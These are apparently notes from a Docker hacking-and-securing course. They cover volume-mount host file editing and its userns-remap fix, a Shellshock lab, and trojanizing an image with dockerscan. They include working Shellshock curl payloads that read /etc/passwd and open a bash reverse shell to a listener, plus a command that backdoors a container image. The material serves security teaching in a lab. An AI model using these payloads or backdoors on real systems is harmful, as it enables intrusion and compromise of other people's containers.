# Exploiting vulnerable images

<sub>You can buy this course on Udemy following this link: [Hacking and Securing Docker Containers](https://www.udemy.com/course/hacking-and-securing-docker-containers/)</sub>

## Namespaces

### Editing read-only files as root from containers

Normally we run containers with our users, with or without sudoers.
Even if we are only in a single docker group, it allows you to run docker.
But we have a problem in this case. A **security** problem.

```bash
gle003@vb-ubuntu:~$ ll /tmp/file.txt
-rw-r--r-- 1 root root 36 jul 11 14:53 /tmp/file.txt
```
> ​	*file.txt* was created with root user.

As you can see, *file.txt* has **no write** to other users than root.

```bash
gle003@vb-ubuntu:~$ cat /tmp/file.txt
File from VM. Out of the container.
gle003@vb-ubuntu:~$ echo "Edit from non-root user" >> /tmp/file.txt
-su: /tmp/file.txt: Permission denied
```
If we start a container **sharing a folder from the machine**, you can login inside the container and have root privileges, as I show below:

```bash
#Creating a new container and sharing /tmp/
gle003@vb-ubuntu:~$ docker run -itd -v /tmp/:/shared/ --name alpine_broken alpine
3be059a0473ddc9cbe33c1a95ba4e52d25525d912cd8ef5a01f1da0066c7a6eb
gle003@vb-ubuntu:~$ docker exec -it alpine_broken sh

#Testing if it is possible to edit file.txt from the container
~ # ls -l /shared/file.txt
-rw-r--r--    1 root     root            36 Jul 11 17:53 /shared/file.txt
~ # echo "Edit from container." > /shared/file.txt
~ # cat /shared/file.txt
Edit from the container.
~ # exit

#Seeing that it changed from the machine
gle003@vb-ubuntu:~$ cat /tmp/file.txt
Edit from the container.
```

As you can see, even if the file is writable only for root user, I can edit it from the container.

> **Why?**
>
> Because root user from the container has the same uid that root user has in the machine.



### Use namespaces for isolation between containers and hosts

Now I'll tell you how to *fix* this problem.

We will work with **user namespaces** for isolation between containers and hosts.

Let's edit **docker.service** to start with **userns-remap**:

```bash
gle003@vb-ubuntu:~$ sudo vim /lib/systemd/system/docker.service
```

Look for **ExecStart** and, at the end of the line add **--userns-remap=default**.

It will looks like the line below:

```sh
[Service]
Type=notify
ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock --userns-remap=default
```

After you change it, you need to reload the daemon and restart the docker.service.

```bash
gle003@vb-ubuntu:~$ sudo systemctl daemon-reload
gle003@vb-ubuntu:~$ sudo systemctl restart docker
gle003@vb-ubuntu:~$ ps aux | grep docker
root     10479  0.4  4.0 831120 83004 ?        Ssl  03:30   0:00 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock --userns-remap=default
gle003   10625  0.0  0.0  14428  1048 pts/0    S+   03:30   0:00 grep --color=auto docker
```

> You can see that docker already started with our new information, **--userns-remap=default**.



Now we will check if we still can edit files from the machine inside the containers.

```bash
#Remove old containers
gle003@vb-ubuntu:~$ docker rm `docker ps -aq`
67f92151a83d
dc20ce8d6903
gle003@vb-ubuntu:~$ docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES

#Start a new one and share /tmp/ from machine
gle003@vb-ubuntu:~$ docker run -itd -v /tmp/:/shared/ --name alpine_hard alpine
2e852e1f0a0ece3b5be1e1baee79b51d4242751d2918cf6c06aadc1b398de91c
gle003@vb-ubuntu:~$ docker exec -it alpine_hard sh

#Try to edit the file.txt from the container
/ # ls -l /shared/file.txt
-rw-r--r--    1 nobody   nobody          21 Jul 12 06:12 /shared/file.txt
/ # echo "Edit again from container." > /shared/file.txt
sh: can't create /shared/file.txt: Permission denied
```

Now it is no more possible to edit outside files from containers using **-v** option.







## ShellShock

We can test this vulnerability using an image that already has it.

Then we pull and use this image from Docker Hub: [vulnerables/cve-2014-6271](https://hub.docker.com/r/vulnerables/cve-2014-6271).

```bash
gle003@vb-ubuntu:~$ docker run -itd -p 8080:80 --name shellshock vulnerables/cve-2014-6271
560ef2f4a0bd4f9a3ad4ac2b59d180030290a83ae91287fa3a6c2e835cb4fe1e
gle003@vb-ubuntu:~$ docker ps
CONTAINER ID        IMAGE                       COMMAND              CREATED             STATUS              PORTS                  NAMES
560ef2f4a0bd        vulnerables/cve-2014-6271   "/main.sh default"   3 seconds ago       Up 1 second         0.0.0.0:8080->80/tcp   shellshock
```

> To see if you got the right way, follow this link: http://localhost:8080/



Ok, now we have an image vulnerable to Shellshock. Let's test it.

```bash
gle003@vb-ubuntu:~$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://localhost:8080/cgi-bin/vulnerable
```

If you sent this command and got /etc/passwd outputed, it is all right!



But we can not only send command by command. We can explore it an go to inside the container. 

Now you need to open two terminals. One you will use as a listener and the other as the attacker.

First one, you need to send it from the **Listener**:

```bash
gle003@vb-ubuntu:~$ nc -lvp 4444
```

Then, you need to break it from the **Attacker**:

```bash
gle003@vb-ubuntu:~$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.15.100/4444 0>&1'" http://localhost:8080/cgi-bin/vulnerable
```

Now, back to the **Listener** and you can send command however you want.

> You also can see more about ShellShock **[here](https://blog.cloudflare.com/inside-shellshock/)**. 



### But, am I inside a container?

After the previous commands using ShellShock, you can use shell commands, but where you are? Are you inside a container? As we can see, it is not unusual to be confused about where you are. So let's see how to be sure about it.

Sending the command **cat /proc/self/cgroup** you can see the answer.

```bash
www-data@560ef2f4a0bd:/usr/lib/cgi-bin$ cat /proc/self/cgroup
cat /proc/self/cgroup
12:devices:/docker/560ef2f4a0bd4f9a3ad4ac2b59d180030290a83ae91287fa3a6c2e835cb4fe1e
11:pids:/docker/560ef2f4a0bd4f9a3ad4ac2b59d180030290a83ae91287fa3a6c2e835cb4fe1e
10:memory:/docker/560ef2f4a0bd4f9a3ad4ac2b59d180030290a83ae91287fa3a6c2e835cb4fe1e
9:rdma:/
8:hugetlb:/docker/560ef2f4a0bd4f9a3ad4ac2b59d180030290a83ae91287fa3a6c2e835cb4fe1e
7:cpu,cpuacct:/docker/560ef2f4a0bd4f9a3ad4ac2b59d180030290a83ae91287fa3a6c2e835cb4fe1e
6:net_cls,net_prio:/docker/560ef2f4a0bd4f9a3ad4ac2b59d180030290a83ae91287fa3a6c2e835cb4fe1e
5:cpuset:/docker/560ef2f4a0bd4f9a3ad4ac2b59d180030290a83ae91287fa3a6c2e835cb4fe1e
4:blkio:/docker/560ef2f4a0bd4f9a3ad4ac2b59d180030290a83ae91287fa3a6c2e835cb4fe1e
3:perf_event:/docker/560ef2f4a0bd4f9a3ad4ac2b59d180030290a83ae91287fa3a6c2e835cb4fe1e
2:freezer:/docker/560ef2f4a0bd4f9a3ad4ac2b59d180030290a83ae91287fa3a6c2e835cb4fe1e
1:name=systemd:/docker/560ef2f4a0bd4f9a3ad4ac2b59d180030290a83ae91287fa3a6c2e835cb4fe1e
0::/system.slice/containerd.service
```

The previous bash output tell us that we are in a container. You can see that all lines means a docker container.



Let's see how it works in a virtual machine:

```bash
gle003@vb-ubuntu:~$ cat /proc/self/cgroup
12:devices:/user.slice
11:pids:/user.slice/user-1000.slice/session-5.scope
10:memory:/user.slice
9:rdma:/
8:hugetlb:/
7:cpu,cpuacct:/user.slice
6:net_cls,net_prio:/
5:cpuset:/
4:blkio:/user.slice
3:perf_event:/
2:freezer:/
1:name=systemd:/user.slice/user-1000.slice/session-5.scope
0::/user.slice/user-1000.slice/session-5.scope
```

As you can see, it doesn't means any docker container.

This is one way to see where you are.



## Backdooring existing images

To test this attack, we need to install some features (official page: [cr0hn](https://github.com/cr0hn/dockerscan)).

```bash
#Install dockerscan by cr0hn
gle003@vb-ubuntu:~$ git clone https://github.com/cr0hn/dockerscan
gle003@vb-ubuntu:~$ cd dockerscan/
gle003@vb-ubuntu:~/dockerscan$ sudo python3.6 -m pip install -U pip
gle003@vb-ubuntu:~/dockerscan$ sudo python3.6 -m pip install dockerscan

#Verify dockerscan
gle003@vb-ubuntu:~/dockerscan$ dockerscan -h
```

> If you have problems to use python pip, you can install with **$ sudo apt-get install python3-pip**

Now you have **dockerscan** installed in your machine. Let's use it to infect an image.

```bash
#Install the ubuntu image
gle003@vb-ubuntu:~$ mkdir backdoor
gle003@vb-ubuntu:~$ cd backdoor/
gle003@vb-ubuntu:~/backdoor$ docker pull ubuntu:latest && docker save ubuntu:latest -o ubuntu-original
gle003@vb-ubuntu:~/backdoor$ export LC_ALL=C.UTF-8
gle003@vb-ubuntu:~/backdoor$ export LANG=C.UTF-8

#Modify the image
#gle003@vb-ubuntu:~/backdoor$ dockerscan image modify trojanize ubuntu-original -l <REMOTE_MACHINE_IP> -p <PORT> -o ubuntu-original-trojanized
gle003@vb-ubuntu:~/backdoor$ dockerscan image modify trojanize ubuntu-original -l 192.168.15.100 -p 4444 -o ubuntu-original-trojanized
```

In this part you need to open another terminal (listener) and run these commands:

**Listener**:

```bash
gle003@vb-ubuntu:~$ nc -v -k -l 192.168.15.100 4444
```

**Attacker**:

```bash
#Start the modified image
gle003@vb-ubuntu:~/backdoor$ docker load -i ubuntu-original-trojanized.tar
gle003@vb-ubuntu:~/backdoor$ docker run -it ubuntu:latest /bin/bash
```

After that you can send commands from the **listener**.

```bash
gle003@vb-ubuntu:~$ nc -v -k -l 192.168.15.100 4444
Listening on [192.168.15.100] (family 0, port 4444)
Connection from 172.17.0.2 33052 received!
connecting people
cat /proc/self/cgroup
12:devices:/docker/16baf8912712cb4a0c4da53c0eac0ddc263aa170999e15c7a5bf84db35f41aa7
11:pids:/docker/16baf8912712cb4a0c4da53c0eac0ddc263aa170999e15c7a5bf84db35f41aa7
10:memory:/docker/16baf8912712cb4a0c4da53c0eac0ddc263aa170999e15c7a5bf84db35f41aa7
9:rdma:/
8:hugetlb:/docker/16baf8912712cb4a0c4da53c0eac0ddc263aa170999e15c7a5bf84db35f41aa7
7:cpu,cpuacct:/docker/16baf8912712cb4a0c4da53c0eac0ddc263aa170999e15c7a5bf84db35f41aa7
6:net_cls,net_prio:/docker/16baf8912712cb4a0c4da53c0eac0ddc263aa170999e15c7a5bf84db35f41aa7
5:cpuset:/docker/16baf8912712cb4a0c4da53c0eac0ddc263aa170999e15c7a5bf84db35f41aa7
4:blkio:/docker/16baf8912712cb4a0c4da53c0eac0ddc263aa170999e15c7a5bf84db35f41aa7
3:perf_event:/docker/16baf8912712cb4a0c4da53c0eac0ddc263aa170999e15c7a5bf84db35f41aa7
2:freezer:/docker/16baf8912712cb4a0c4da53c0eac0ddc263aa170999e15c7a5bf84db35f41aa7
1:name=systemd:/docker/16baf8912712cb4a0c4da53c0eac0ddc263aa170999e15c7a5bf84db35f41aa7
0::/system.slice/containerd.service
```



### How would I escape from it?

Downloading third-party Docker images can be a danger way to do it.

To avoid this problem you need to download images from trusted sources, as [Docker Hub](https://hub.docker.com/).



## Privilege escalation using volume mounts

